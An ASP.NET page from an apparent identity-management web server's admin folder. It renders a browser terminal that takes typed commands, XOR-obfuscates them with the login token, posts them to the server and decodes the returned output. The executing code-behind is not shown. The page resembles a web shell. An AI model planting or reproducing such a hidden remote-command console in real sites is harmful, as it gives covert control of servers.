<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="ws.aspx.cs" Inherits="IAMWebServer._admin._ws.ws" %>

<%
if (!String.IsNullOrEmpty(Request.QueryString["js"]))
{

    Response.ContentType = "text/javascript; charset=utf-8";
    
 %>
     
var factor=<%=login.SecurityToken%>;

function resizeContent() {
    $height = $(window).height();
    $('#vt100').height($height);
}

function decode(hex) {
    var hex = hex.toString(); //force conversion
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16) ^ factor);
    return str;
}

function prepare(str) {
    var hex = '';
    for (var i = 0; i < str.length; i++) {
        hex += '' + (str.charCodeAt(i) ^ factor).toString(16);
    }
    return hex;
}

jQuery(document).ready(function ($) {
    $('#input').focus();

    resizeContent();

    $(window).resize(function () {
        resizeContent();
    });
        
        $('#vt100').click(function (event) {
        $('#input').focus();
    });

    $('#vt100 .line').click(function (event) {
        //event.preventDefault();
        event.stopPropagation();
    });

    $('#input').keypress(function (e) {
        if (e.which == 13) {
            $('#cmd').val(prepare($('#input').val()));
            $('body form').submit();

        }
    });

        
    $('#vt100 .to-decode').each(function (index, element) {
        $(this).removeClass('to-decode');
        $(this).text(decode($(this).text()));
    });
});
<%
    }else{    
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xml:lang="en" lang="en">
<head>
<title>OK</title>
<style>
body
{
    margin: 0;
    overflow: hidden;
}
#vt100 #console, #vt100 #alt_console, #vt100 #cursor, #vt100 #lineheight, #vt100 .hidden pre, #vt100 pre .line .input {
    font-family: "DejaVu Sans Mono", "Everson Mono", FreeMono, "Andale Mono", Consolas, monospace;
}
#vt100
{
    width: 100%;
    height: 100%;
}

#vt100 #scrollable {
    color: #ffffff;
    background-color: #000000;
}

#vt100 #scrollable {
    overflow-x: hidden;
    overflow-y: scroll;
    position: relative;
    padding: 1px;
    height: 100%;
}

#vt100 pre,  #vt100 pre .line .input {
    font-size: 15px;
}

 #vt100 pre .line .input:focus {
 outline: none;
}

#vt100 pre {
    margin: 0px;
}
#vt100 pre .line
{
    height: 15px;
}

#vt100 pre .line .input{
    width:80%;
    border:0px;
    height: 100%;
    padding:0;
    background-color: black;
    color: white; /* color of caret */
    -webkit-text-fill-color: white; /* color of text */
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;    
    box-sizing: border-box;
}

#vt100 #cursor.bright {
  background-color:     black;
  color:                white;
}
#vt100 #cursor {
    position: absolute;
    left: 0px;
    top: 0px;
    overflow: hidden;
    z-index: 1;
}

#vt100 #cursor.dim {
  background-color:     white;
  opacity:              0.2;
  -moz-opacity:         0.2;
  filter:               alpha(opacity=20);
}

#vt100 #cursor.inactive {
    border: 1px solid;
    margin: -1px;
}

</style>
<script src="/js/jquery-1.10.2.min.js" type="text/javascript"></script>
<script src="?js=<%=ToUnixTime(DateTime.Now) %>" type="text/javascript"></script>
</head>
<body>
<div id="vt100">
<div id="scrollable">
<pre id="console">
<asp:PlaceHolder ID="mainContent" runat="server"></asp:PlaceHolder>
<div class="line">Enter your command> <input id="input" class="input" type="text" autocomplete="off" /></div>
</pre>    
</div>
</div>
<form method="POST"><input type="hidden" name="cmd" id="cmd" /></form>
</body>
</html>
<%
}  
%>